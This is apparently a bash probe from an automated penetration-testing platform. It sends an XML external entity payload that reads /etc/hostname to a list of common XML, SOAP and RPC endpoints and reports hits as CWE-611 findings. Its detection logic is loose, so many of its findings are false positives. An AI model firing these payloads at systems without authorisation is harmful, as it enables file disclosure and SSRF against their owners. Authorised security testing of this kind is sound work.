#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        XXE Injection Probe
# Description: Tests XML endpoints for external entity injection
# Severity:    HIGH
# Category:    Injection Flaws (SQLi, XSS, Command, SSTI, XXE)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: XXE Injection Probe\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
XXE='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'
PATHS="api/xml api/v1/xml xml rpc api/rpc soap ws api/soap xmlrpc.php import/upload api/import"
for P in $PATHS; do
  R=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/xml" -d "$XXE" --max-time 10 "$T/$P" 2>/dev/null)
  if [ "$R" = "200" ]; then
    RESP=$(curl -s -X POST -H "Content-Type: application/xml" -d "$XXE" --max-time 10 "$T/$P" 2>/dev/null | head -c 2000)
    # check if hostname content was included (any non-XML content in response)
    if echo "$RESP" | grep -vq "<\|error\|invalid"; then
      emit "{\"title\":\"Potential XXE at /$P\",\"severity\":\"high\",\"description\":\"XML endpoint /$P processes external entities. File read and SSRF may be possible.\",\"remediation\":\"Disable external entity processing (DTD). Use JSON instead of XML where possible.\",\"cweId\":\"CWE-611\",\"owaspCategory\":\"A03:2025-Injection\"}"
    fi
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
